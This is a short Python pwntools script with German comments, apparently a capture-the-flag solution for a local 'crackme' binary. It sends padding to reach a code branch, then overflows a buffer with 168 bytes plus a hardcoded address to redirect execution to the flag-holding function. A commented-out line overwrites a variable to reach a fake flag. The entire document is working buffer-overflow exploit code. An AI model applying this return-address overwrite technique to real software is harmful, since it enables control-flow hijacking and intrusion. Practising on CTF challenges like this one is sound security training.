#!/usr/bin/env python3

from pwn import *

io = process('./crackme')
io.recvline()
#Den Kommentar kann man rausnehmen, wenn man sich die FakeFlag anschauen will
#io.sendline(b'A'*76 +b'\xce\xfa\xad\x0b')

#Bei der ersten Eingabe wird nur was geschrieben, damit es nicht überschrieben wird und man in den else Teil kommt.
io.sendline(b'A'*76)

#Danach wird der zweite Overflow mit dem zweiten sendline erzwungen. 168 Charactere und zusätzlich die Adresse, wo die Flag drin ist.
io.sendline(b'B'*148 + b'A'*20 +b'\xce\x12\x40') #168

io.interactive()
